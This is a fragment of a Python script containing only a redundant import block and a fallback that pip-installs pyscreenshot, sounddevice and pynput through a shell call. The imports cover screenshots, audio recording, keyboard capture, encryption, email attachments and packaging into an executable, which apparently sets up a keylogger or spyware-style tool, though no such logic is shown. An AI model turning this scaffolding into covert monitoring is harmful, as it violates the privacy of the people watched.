try:
    import logging
    import os
    import platform
    import smtplib
    import socket
    import threading
    import wave
    import pyscreenshot
    import sounddevice
    import glob
    import tkinter
    import requests
    import bs4
    #import dns.resolver
    import socket
    import subprocess
    import argparse
    import sys
    import urllib 
    import os 
    import time
    import argparse
    #import kitools
    from concurrent.futures import ThreadPoolExecutor as executor
    import socket
    import sys
    from cryptography.fernet import Fernet
    from cx_Freeze import setup, Executable
    import smtplib
    import subprocess
    from email import encoders
    from email.mime.base import MIMEBase
    from email.mime.multipart import MIMEMultipart
    from email.mime.text import MIMEText
    import glob
except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)